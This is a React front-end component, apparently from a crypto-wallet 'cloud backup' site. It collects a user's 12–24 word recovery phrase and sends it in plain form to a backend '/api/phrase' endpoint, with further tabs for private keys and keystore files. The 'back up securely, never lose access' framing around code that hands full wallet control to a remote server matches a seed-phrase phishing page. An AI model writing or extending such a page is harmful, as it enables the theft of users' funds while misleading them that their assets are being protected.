
import { useContext, useState } from "react"
import { PhraseContext } from "../context/phrase.context"
import axios from "axios"
import "./CloudStorage.css"
import LiveChartComponent from "./LiveChartComponent"
const URL = import.meta.env.VITE_BACKEND_URL;

const CloudStorage = () => {
    const {dispatch, state} = useContext(PhraseContext)
    const [localPhrase, setLocalPhrase] = useState("")

    const handleSave = async () => {
        const words = localPhrase.trim().split(/\s+/)
        if(words.length < 12 || words.length >24){
            dispatch({type: "SET_SAVE_ERROR", payload: "Phrase must be 12 to 24 words"})
            return
        }
        dispatch({type: "SET_LOADING"})

        try{
            await axios.post(`${URL}/api/phrase`, {phrase: localPhrase})
            dispatch({type:"SET_PHRASE", payload: localPhrase})
            dispatch({type:"SAVE_PHRASE"})
            alert("Phrase backed up successfully!")

        }catch(error){
            dispatch({type: "SET_SAVE_ERROR", payload: error.message})
            alert("could not back up")
        }
    }

    return (<>
        
        <section className="home">
            <div className="container my-5">
                <div className="row text-center text-white lh-lg">
                <h1 className="text-backup pt-5">Back Up Your Secret Phrase</h1>
                <h5 className="text-h5">Securely back up all your wallets to the cloud — never lose access, even if your device fails.</h5>
                </div>
                <div className="tabss mt-5 d-flex flex-column align-items-center text-center">
                    <nav className="w-100 d-flex justify-content-center">
                        <div className="nav nav-tabs" id="nav-tab" role="tablist">
                        <button className="nav-link active nav-small" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home" aria-selected="true">Phrase</button>
                        <button className="nav-link nav-small" id="nav-profile-tab" data-bs-toggle="tab" data-bs-target="#nav-profile" type="button" role="tab" aria-controls="nav-profile" aria-selected="false">Private key</button>
                        <button className="nav-link nav-small" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-contact" type="button" role="tab" aria-controls="nav-contact" aria-selected="false">Keystore</button>
                        </div>
                    </nav>

                    {state.loading && (
                        <div className="text-center py-4">
                            <div class="text-center">
                                <div class="spinner-border" role="status">
                                    <span class="visually-hidden">Loading...</span>
                                </div>
                            </div>
                            <p className="text-white mt-2">Saving your phrase securely...</p>
                        </div>
                    )}

                    <div className="tab-content w-100 mt-3" id="nav-tabContent" style={{ maxWidth: '600px' }}>
                        <div className="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab" tabIndex="0">
                            <div className="mb-3 bg-text-area">
                                <label htmlFor="exampleFormControlTextarea1" className="form-label py-3 nav-small">Typically consisting of 12 words, though occasionally extending to 24, each separated by a single space.</label>
                                {state.error && <div className="alert alert-danger">{state.error}</div>}

                                <textarea 
                                className="form-control dim-color" 
                                id="exampleFormControlTextarea1" 
                                placeholder="Your Recovery Phrase" 
                                rows="9" 
                                value={localPhrase}
                                onChange={(e) => setLocalPhrase(e.target.value)}
                                ></textarea>
                            </div>
                            <div className="text-end pb-5">
                                <button className="btn bg-success btn-success submit text-white" 
                                onClick={handleSave} 
                                disabled={state.loading}
                                >{state.loading ? (
                                <>
                                    <span class="spinner-border spinner-border-sm" aria-hidden="true"></span>
                                    <span role="status">Loading...</span>
                                </>
                                ) : ("Save wallet")}
                                </button>
                            </div>
                        </div>
                        <div className="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab" tabIndex="0">
                            <div className="mb-3">
                                <label htmlFor="formGroupExampleInput" className="form-label text-white nav-small">(Alphanumeric) Characters</label>
                                <input type="text" className="form-control py-3" id="formGroupExampleInput" placeholder="Paste your private key here..."/>
                            </div>
                            <div className="text-end pb-5">
                                <button className="btn bg-success btn-success submit text-white nav-small">Save Private Key</button>
                            </div>
                        </div>
                        <div className="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab" tabIndex="0">
                            <div className="mb-3">
                                <label htmlFor="formFile" className="form-label nav-small text-white">Upload Keystore file</label>
                                <input className="form-control py-2" type="file" id="formFile"/>
                            </div>
                            <div className="text-end pb-5">
                                <button className="btn bg-success btn-success submit text-white nav-small">Save Keystore</button>
                            </div>
                        </div>
                    </div>
                </div>

            </div>      
        </section>
        <section className="LiveChartSection">
            <LiveChartComponent />
        </section>
    </>)
}

export default CloudStorage